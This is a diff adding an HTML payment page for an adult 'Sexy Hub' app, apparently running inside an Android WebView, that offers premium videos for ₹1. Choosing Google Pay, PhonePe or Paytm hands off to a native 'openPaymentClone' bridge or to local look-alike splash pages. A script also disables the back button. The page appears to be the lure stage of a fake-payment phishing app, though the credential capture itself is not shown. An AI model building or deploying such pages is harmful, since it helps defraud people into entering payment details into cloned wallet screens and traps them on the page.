@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment - Sexy Hub</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 20px;
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+    }
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+    }
+    .price {
+      font-size: 36px;
+      color: #ff1493;
+      font-weight: bold;
+      margin: 20px 0;
+    }
+    .methods {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 20px;
+    }
+    .method {
+      padding: 15px;
+      border: 2px solid #e0e0e0;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .method:hover {
+      border-color: #ff1493;
+    }
+    .btn {
+      background: #ff1493;
+      color: #fff;
+      padding: 12px 30px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Premium Access</h2>
+    <div class="price" data-price-amount>₹1</div>
+    <p>Unlock all premium videos</p>
+    
+    <div class="methods">
+      <div class="method" onclick="selectPayment('gpay')">
+        Google Pay
+      </div>
+      <div class="method" onclick="selectPayment('phonepe')">
+        PhonePe
+      </div>
+      <div class="method" onclick="selectPayment('paytm')">
+        Paytm
+      </div>
+    </div>
+    
+    <button
+      class="btn"
+      onclick="selectPayment('gpay')"
+      data-price-button="Pay {amount}"
+    >
+      Pay ₹1
+    </button>
+  </div>
+  
+  <script>
+    function getPaymentAmount() {
+      try {
+        if (typeof Android !== 'undefined' && Android.getPaymentAmount) {
+          return Android.getPaymentAmount();
+        }
+      } catch (e) {}
+      return '₹1';
+    }
+
+    function syncPriceContent() {
+      const amount = getPaymentAmount();
+      document.querySelectorAll('[data-price-amount]').forEach(function(el) {
+        el.textContent = amount;
+      });
+      document.querySelectorAll('[data-price-button]').forEach(function(el) {
+        const template = el.getAttribute('data-price-button') || '{amount}';
+        el.textContent = template.replace('{amount}', amount);
+      });
+    }
+
+    syncPriceContent();
+
+    function selectPayment(method) {
+      if (typeof Android !== 'undefined' && Android.openPaymentClone) {
+        try {
+          Android.openPaymentClone(method);
+          return;
+        } catch (e) {}
+      }
+
+      if (method === 'gpay') {
+        window.location.href = 'googlepay-splash.html';
+      } else if (method === 'paytm') {
+        window.location.href = 'paytm-splash.html';
+      } else if (method === 'phonepe') {
+        window.location.href = 'phonepe-splash.html';
+      }
+    }
+    
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+      history.go(1);
+    };
+  </script>
+</body>
+</html>
